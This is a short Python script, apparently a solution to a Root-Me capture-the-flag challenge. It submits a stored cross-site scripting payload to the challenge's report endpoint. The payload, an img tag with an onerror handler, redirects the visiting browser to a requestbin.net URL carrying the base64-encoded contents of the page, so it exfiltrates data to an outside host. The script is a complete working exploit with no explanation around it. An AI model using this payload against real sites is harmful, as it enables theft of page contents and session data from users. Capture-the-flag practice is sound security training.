import requests 
url = 'http://challenge01.root-me.org:58008/report'
url1 = 'http://challenge01.root-me.org:58008/page?user='


pay1 = '''<img/src =x onerror="window.top.location = '//requestbin.net/r/fq5uqccc?flag='.concat(btoa(encodeURIComponent(document.body.innerHTML)))">'''

print(pay1)
data = {'url':url1+pay1}
x = requests.post(url,data=data)

# check the url and get result